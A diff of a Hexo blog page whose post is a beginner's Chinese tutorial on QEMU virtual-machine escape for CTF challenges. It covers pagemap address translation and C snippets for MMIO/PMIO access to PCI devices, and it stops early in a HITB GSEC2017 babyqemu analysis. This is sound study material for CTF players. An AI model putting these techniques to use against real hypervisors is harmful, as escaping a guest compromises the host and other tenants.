@@ -16,15 +16,23 @@
     
 <link rel="stylesheet" href="/css/style.css">
 
-    <link rel="shortcut icon" href="/images/ufo.ico">
-    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/css/font-awesome.min.css">
-    <script id="hexo-configurations">
-    let KEEP = window.KEEP || {};
-    KEEP.hexo_config = {"hostname":"196082.github.io","root":"/","language":"zh-CN","path":"search.json"};
-    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/ling.JPG","favicon":"/images/ufo.ico","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":true},"version":"3.4.3"};
-    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 月前","year":"%s 年前"};
+    
+        <link rel="shortcut icon" href="/images/ufo.ico">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/regular.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/solid.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/brands.min.css">
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"196082.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"196082's blog","author":196082,"avatar":"/images/ling.JPG","logo":"/images/ling.JPG","favicon":"/images/ufo.ico"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":"浅浅更新博客一下吧~","category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":false,"custom_badge":"慢慢好起来"},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":true,"img_link":"/images/reward.jpg","text":"激励牛马，加速创作！","icon":"fa-solid fa-mug-hot"},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz","appkey":"C672AAYGXMkHxztf8ntdLShs","server_urls":null,"placeholder":"😜若有问题请各位大师傅留言评论"},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"feed":{"type":"atom","path":"atom.xml","limit":20},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.2"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
   </script>
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
+<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
 </head>
 
 
@@ -36,67 +44,81 @@
 </div>
 
 
-<main class="page-container">
 
+<main class="page-container border-box">
+    <!-- home first screen  -->
     
 
-    <div class="page-main-content">
-
+    <!-- page content -->
+    <div class="page-main-content border-box">
         <div class="page-main-content-top">
-            <header class="header-wrapper">
-
-    <div class="header-content">
-        <div class="left">
             
-            <a class="logo-title" href="/">
-                196082&#39;s blog
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/ling.JPG">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               196082&#39;s blog
             </a>
         </div>
 
-        <div class="right">
-            <div class="pc">
-                <ul class="menu-list">
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/"
-                            >
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
                                 首页
+                                
                             </a>
+                            
                         </li>
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/archives"
-                            >
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
                                 归档
+                                
                             </a>
+                            
                         </li>
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/categories"
-                            >
-                                分类
-                            </a>
-                        </li>
-                    
-                        <li class="menu-item">
-                            <a class=""
-                               href="/tags"
-                            >
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
                                 标签
+                                
                             </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
                         </li>
                     
                     
                         <li class="menu-item search search-popup-trigger">
-                            <i class="fas fa-search"></i>
+                            <i class="menu-text-color fas search fa-search"></i>
                         </li>
                     
                 </ul>
             </div>
-            <div class="mobile">
+            <div class="mobile border-box flex-start">
                 
                     <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                 
@@ -108,26 +130,54 @@
     </div>
 
     <div class="header-drawer">
-        <ul class="drawer-menu-list">
+        <ul class="drawer-menu-list border-box">
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/">首页</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/archives">归档</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/categories">分类</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/tags">标签</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
         </ul>
@@ -140,100 +190,125 @@
 
         </div>
 
-        <div class="page-main-content-middle">
+        <div class="page-main-content-middle border-box">
 
-            <div class="main-content">
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        qemu逃逸入门
+                    </div>
+                
 
                 
-                    <div class="fade-in-down-animation">
-    <div class="article-content-container">
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/ling.JPG">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">196082</span>
+                                
+                                    <span class="author-badge">慢慢好起来</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
 
-        <div class="article-title">
-            <span class="title-hover-animation">qemu逃逸入门</span>
-        </div>
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
 
         
-            <div class="article-header">
-                <div class="avatar">
-                    <img src="/images/ling.JPG">
-                </div>
-                <div class="info">
-                    <div class="author">
-                        <span class="name">196082</span>
-                        
-                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
-    <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;2023-02-05 17:39:57
-    </span>
-    
-        <span class="article-categories article-meta-item">
-            <i class="fas fa-folder"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/categories/qemu-escape/">qemu escape</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
-    
-        <span class="article-tags article-meta-item">
-            <i class="fas fa-tags"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/tags/qemu-escape/">qemu escape</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2023-02-05 17:39:57</span>
+            </span>
 
-    
-    
-        <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>4.6k 字</span>
-        </span>
-    
-    
-        <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>23 分钟</span>
-        </span>
-    
-    
-        <span class="article-pv article-meta-item">
-            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
-        </span>
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Tue Mar 21 2023 15:58:23 GMT+0800">2023-03-21 15:58:23</span>
+            </span>
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/qemu-escape/">qemu escape</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/qemu-escape/">qemu escape</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>4.6k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>23 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
     
 </div>
 
+                            </div>
+                        </div>
                     </div>
-                </div>
-            </div>
-        
+                
 
-        <div class="article-content markdown-body">
-            <p>首先总所周知的是，qemu是一个开源的模拟器和虚拟机，通过动态的二进制转换来模拟 CPU的工具。</p>
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <p>首先总所周知的是，qemu是一个开源的模拟器和虚拟机，通过动态的二进制转换来模拟 CPU的工具。</p>
 <p>在实际的环境中，qemu有多种运行模式，在以往可以使用User mode调试arm、mips架构的二进制程序。也在kernel pwn中用System mode调试完整的计算机系统。而qemu逃逸的题目指的就是System mode这种模式，题目的形式主要是给出存在漏洞的设备然后加以利用。</p>
 <h2 id="qemu的内存结构"><a href="#qemu的内存结构" class="headerlink" title="qemu的内存结构"></a>qemu的内存结构</h2><p>qemu使用mmap为虚拟机申请出相应大小的内存，当做虚拟机的物理内存，且这部分内存没有执行权限。</p>
 <h3 id="qemu的地址转化"><a href="#qemu的地址转化" class="headerlink" title="qemu的地址转化"></a>qemu的地址转化</h3><p>用户虚拟地址-&gt;用户物理地址</p>
 <p>用户物理地址-&gt;qemu的虚拟地址空间：这里是将用户的物理地址转化为qemu使用mmap申请出来的地址空间，而这部分空间的内容与用户的物理地址一一对应。</p>
-<p>在 x64 系统上，虚拟地址由 page offset (bits 0-11) 和 page number 组成，/proc/$pid/pagemap 这个文件中储存着此进程的页表，让用户空间进程可以找出每个虚拟页面映射到哪个物理帧（需要 CAP_SYS_ADMIN 权限），它包含一个 64 位的值，包含以下的数据。</p>
+<p>在 x64 系统上，虚拟地址由 page offset (bits 0-11) 和 page number 组成，&#x2F;proc&#x2F;$pid&#x2F;pagemap 这个文件中储存着此进程的页表，让用户空间进程可以找出每个虚拟页面映射到哪个物理帧（需要 CAP_SYS_ADMIN 权限），它包含一个 64 位的值，包含以下的数据。</p>
 <ul>
-<li>  Bits 0-54 page frame number (PFN) if present</li>
-<li>  Bits 0-4 swap type if swapped</li>
-<li>  Bits 5-54 swap offset if swapped</li>
-<li>  Bit 55 pte is soft-dirty (see Documentation/vm/soft-dirty.txt)</li>
-<li>  Bit 56 page exclusively mapped (since 4.2)</li>
-<li>  Bits 57-60 zero</li>
-<li>  Bit 61 page is file-page or shared-anon (since 3.5)</li>
-<li>  Bit 62 page swapped</li>
-<li>  Bit 63 page present</li>
+<li>Bits 0-54 page frame number (PFN) if present</li>
+<li>Bits 0-4 swap type if swapped</li>
+<li>Bits 5-54 swap offset if swapped</li>
+<li>Bit 55 pte is soft-dirty (see Documentation&#x2F;vm&#x2F;soft-dirty.txt)</li>
+<li>Bit 56 page exclusively mapped (since 4.2)</li>
+<li>Bits 57-60 zero</li>
+<li>Bit 61 page is file-page or shared-anon (since 3.5)</li>
+<li>Bit 62 page swapped</li>
+<li>Bit 63 page present</li>
 </ul>
 <p>根据以上信息，利用<code>/proc/pid/pagemap</code>可将虚拟地址转换为物理地址，具体步骤如下：</p>
 <p>1、 计算虚拟地址所在虚拟页对应的数据项在<code>/proc/pid/pagemap</code>中的偏移，<code>offset=(viraddr/pagesize)*sizeof(uint64_t)</code></p>
@@ -246,24 +321,14 @@
 
 <h2 id="PCI设备"><a href="#PCI设备" class="headerlink" title="PCI设备"></a>PCI设备</h2><p>符合 PCI 总线标准的设备就被称为 PCI 设备，PCI 总线架构中可以包含多个 PCI 设备。PCI 设备同时也分为主设备和目标设备两种，主设备是一次访问操作的发起者，而目标设备则是被访问者。</p>
 <h3 id="mmio"><a href="#mmio" class="headerlink" title="mmio"></a>mmio</h3><p>而在设备中存在不同的地址映射模式。而mmio则是内存映射io，和内存共享一个地址空间。可以和像读写内存一样读写其内容。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/t01a97028b7de9d6955.png"
-                      alt="t01a97028b7de9d6955"
-                ></p>
+<p><img   src="/images/t01a97028b7de9d6955.png"  alt="t01a97028b7de9d6955"></p>
 <ul>
-<li>  Bit 0：Region Type，总是为 0，用于区分此类型为 Memory</li>
-<li>  Bits 2-1：Locatable，为 0 时表示采用 32 位地址，为 2 时表示采用 64 位地址，为 1 时表示区间大小小于 1MB</li>
-<li>  Bit 3：Prefetchable，为 0 时表示关闭预取，为 1 时表示开启预取</li>
-<li>  Bits 31-4：Base Address，以 16 字节对齐基址</li>
+<li>Bit 0：Region Type，总是为 0，用于区分此类型为 Memory</li>
+<li>Bits 2-1：Locatable，为 0 时表示采用 32 位地址，为 2 时表示采用 64 位地址，为 1 时表示区间大小小于 1MB</li>
+<li>Bit 3：Prefetchable，为 0 时表示关闭预取，为 1 时表示开启预取</li>
+<li>Bits 31-4：Base Address，以 16 字节对齐基址</li>
 </ul>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/mmio_mem.png"
-                      alt="mmio_mem"
-                ></p>
+<p><img   src="/images/mmio_mem.png"  alt="mmio_mem"></p>
 <p><strong>在用户态下访问mmio空间代码示例：</strong></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    mmio_read(<span class="number">0x128</span>);</span><br><span class="line">    mmio_write(<span class="number">0x128</span>, <span class="number">1337</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -271,46 +336,21 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> addr=ioremap(ioaddr,iomemsize);</span><br><span class="line">readb(addr);</span><br><span class="line">readw(addr);</span><br><span class="line">readl(addr);</span><br><span class="line">readq(addr);<span class="comment">//qwords=8 btyes</span></span><br><span class="line"></span><br><span class="line">writeb(val,addr);</span><br><span class="line">writew(val,addr);</span><br><span class="line">writel(val,addr);</span><br><span class="line">writeq(val,addr);</span><br><span class="line">iounmap(addr);</span><br></pre></td></tr></table></figure>
 
 <h3 id="pmio"><a href="#pmio" class="headerlink" title="pmio"></a>pmio</h3><p>端口映射io，内存和io设备有个字独立的地址空间，cpu需要通过专门的指令才能去访问。在intel的微处理器中使用的指令是IN和OUT。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/pmio.png"
-                      alt="pmio"
-                ></p>
+<p><img   src="/images/pmio.png"  alt="pmio"></p>
 <ul>
-<li>  Bit 0：Region Type，总是为 1，用于区分此类型为 I/O</li>
-<li>  Bit 1：Reserved</li>
-<li>  Bits 31-2：Base Address，以 4 字节对齐基址</li>
+<li>Bit 0：Region Type，总是为 1，用于区分此类型为 I&#x2F;O</li>
+<li>Bit 1：Reserved</li>
+<li>Bits 31-2：Base Address，以 4 字节对齐基址</li>
 </ul>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/pmio_layout.png"
-                      alt="pmio_layout"
-                ></p>
+<p><img   src="/images/pmio_layout.png"  alt="pmio_layout"></p>
 <p><strong>访问pmio代码示例：</strong></p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="keyword">uint32_t</span> pmio_base = <span class="number">0xc050</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(value,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inl(addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">        die(<span class="string">&quot;I/O permission is not enough&quot;</span>);</span><br><span class="line">        pmio_write(pmio_base+<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    pmio_write(pmio_base+<span class="number">4</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h3 id="lspci"><a href="#lspci" class="headerlink" title="lspci"></a>lspci</h3><p>pci外设地址，形如<code>0000:00:1f.1</code>。第一个部分16位表示域；第二个部分8位表示总线编号；第三个部分5位表示设备号；最后一个部分表示3位表示功能号。下面是lspci的输出，其中pci设备的地址，在最头部给出，由于pc设备总只有一个0号域，随意会省略域。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20230204154525744.png"
-                      alt="image-20230204154525744"
-                ></p>
+<p><img   src="/images/image-20230204154525744.png"  alt="image-20230204154525744"></p>
 <p>在<code>/sys/bus/pci/devices</code>可以找到每个总线设备相关的一写文件。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20230204155149832.png"
-                      alt="image-20230204155149832"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20230204155333889.png"
-                      alt="image-20230204155333889"
-                ></p>
+<p><img   src="/images/image-20230204155149832.png"  alt="image-20230204155149832"></p>
+<p><img   src="/images/image-20230204155333889.png"  alt="image-20230204155333889"></p>
 <p>每个设备的目录下<code>resource0</code> 对应MMIO空间。<code>resource1</code> 对应PMIO空间。<br>resource文件里面会记录相关的数据，第一行就是mimo的信息，从左到右是：起始地址、结束地址、标识位。</p>
 <h2 id="HITB-GSEC2017-babyqemu"><a href="#HITB-GSEC2017-babyqemu" class="headerlink" title="HITB GSEC2017 babyqemu"></a>HITB GSEC2017 babyqemu</h2><p><del>因为是第一次玩qemu逃逸，所以题目记录的比较详细，偏向新手向！</del></p>
 <h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>首先注意的是加载文件</p>
@@ -318,12 +358,7 @@
 
 <p>这里需要注意的是 -device 选项，可以看到这里的设备为 hitb 这个pci设备。</p>
 <p>那么逆向的方法就是将qemu-system-x86_64拖入ida搜索hitb</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20230204162747766.png"
-                      alt="image-20230204162747766"
-                ></p>
+<p><img   src="/images/image-20230204162747766.png"  alt="image-20230204162747766"></p>
 <p>首先则是先观察init函数</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_class_init</span><span class="params">(ObjectClass_0 *a1, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ObjectClass_0 *v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = object_class_dynamic_cast_assert(</span><br><span class="line">         a1,</span><br><span class="line">         (<span class="keyword">const</span> <span 